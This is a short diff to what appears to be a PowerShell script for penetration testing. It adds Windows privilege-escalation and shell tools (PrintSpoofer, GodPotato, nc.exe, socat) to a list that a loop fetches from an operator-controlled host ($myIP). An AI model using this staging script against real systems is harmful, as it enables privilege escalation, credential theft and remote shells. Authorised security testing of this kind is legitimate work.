@@ -20,7 +20,17 @@ $files = @(
     "PowerUp.ps1",
     "jaws-enum.ps1",
     "SessionGopher.ps1",
-    "LaZagne.exe"
+    "LaZagne.exe",
+    "accesschk.exe",
+    "PrintSpoofer64",
+    "PrintSpoofer32",
+    "socatx64.exe",
+    "socatx86.exe",
+    "GodPotato-Net2.exe",
+    "GodPotato-Net35.exe",
+    "GodPotato-Net4.exe",
+    "nc.exe",
+    "Watson.exe"
 )
 foreach ($file in $files) {
     $sourceUrl = "http://$myIP/$file"
